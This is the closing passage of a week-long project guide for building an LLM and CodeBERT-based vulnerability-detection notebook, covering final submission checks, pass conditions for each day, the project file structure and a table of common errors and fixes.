- [ ] No `print(df.head())` debug cells — replace with `df.sample(5)` styled display
- [ ] Every code cell has a one-line comment explaining its purpose
- [ ] Every section has a markdown header matching the structure in Section F
- [ ] All `.png` files saved and visible inline via `plt.show()`
- [ ] File saved as `vulnerability_detection.ipynb`

#### 7.6 Submission verification

Run this final check cell before submitting:

```python
import os, json
import pandas as pd

checks = {
    "Dataset file exists":        os.path.exists("vuln_dataset.json"),
    "LLM results file exists":    os.path.exists("llm_eval_results.json"),
    "Embeddings cached (train)":  os.path.exists("X_tr_improved.npy"),
    "Embeddings cached (test)":   os.path.exists("X_te_improved.npy"),
    "Confusion matrix image":     os.path.exists("confusion_comparison.png"),
    "F1 by vuln type image":      os.path.exists("f1_by_vuln_type.png"),
}

for check, status in checks.items():
    icon = "✅" if status else "❌"
    print(f"{icon} {check}")

# Confirm LLM results have expected columns
llm_df = pd.read_json("llm_eval_results.json")
required_cols = {"baseline_valid_json","improved_valid_json","baseline_vuln_type","improved_vuln_type"}
missing = required_cols - set(llm_df.columns)
print(f"\n{'✅' if not missing else '❌'} LLM results columns: {'' if not missing else 'MISSING: '+str(missing)}")
```

### Day 7 Verification Checklist

- [ ] Notebook runs end-to-end with Restart and Run All
- [ ] Summary table for Task 1 (LLM) printed with delta column
- [ ] Summary table for Task 2 (ML) printed with delta column
- [ ] Miss rate (FN / total vulns) printed and < 25%
- [ ] All 6 submission checks pass ✅
- [ ] Total notebook cell count > 40 (indicates completeness)
- [ ] No `SettingWithCopyWarning` or `FutureWarning` in output (clean execution)

---

## Master Verification Summary

| Day | Key Output | Pass Condition |
|---|---|---|
| 1 | `vuln_dataset.json` | ≥ 250 rows, all 5 vuln types, passes `validate_dataset()` |
| 2 | Train/test split | Stratified, 0 overlap, `label_bin` and `label_multi` columns exist |
| 3 | LLM eval loop (dry run) | 5-sample dry run completes, JSON parsing handles edge cases |
| 4 | `llm_eval_results.json` | 50 rows, improved JSON valid % ≥ 90%, improved F1 > baseline |
| 5 | Baseline ML metrics | F1 > 0.55, confusion matrix saved, top TF-IDF features printed |
| 6 | `X_tr_improved.npy` | Shape (n_train, 778), improved F1 > baseline F1 |
| 7 | Final notebook | Runs top-to-bottom, all 6 submission checks pass ✅ |

---

## Appendix: File Structure

```
project/
├── vulnerability_detection.ipynb   ← main deliverable
├── vuln_dataset.json               ← original dataset (≥ 250 rows)
├── vuln_dataset_augmented.json     ← augmented training set
├── llm_eval_results.json           ← LLM evaluation outputs (50 rows)
├── X_tr_improved.npy               ← cached CodeBERT train embeddings
├── X_te_improved.npy               ← cached CodeBERT test embeddings
├── class_distribution.png
├── confusion_baseline.png
├── confusion_comparison.png
└── f1_by_vuln_type.png
```

---

## Appendix: Common Errors and Fixes

| Error | Cause | Fix |
|---|---|---|
| `KeyError: 'vuln_type'` | Dataset missing column | Check `validate_dataset()` output |
| `ValueError: ...only one class present` | Test split has no vulnerable samples | Set `stratify=y_bin` in `train_test_split` |
| `CUDA out of memory` | Batch too large for GPU | Set `batch_size=8` in `build_embedding_matrix` |
| `json.JSONDecodeError` | LLM returned prose instead of JSON | Use prefill `"{"` in assistant turn |
| `F1=0.0` for one class | Imbalance not handled | Add `class_weight="balanced"` to LogisticRegression |
| `RuntimeError: ... torch not compiled with CUDA` | CUDA unavailable | Set `device = "cpu"` — slower but works |
| `AssertionError: Data leakage` | Preprocessing created duplicates | Deduplicate before splitting: `df.drop_duplicates(subset='code_clean')` |
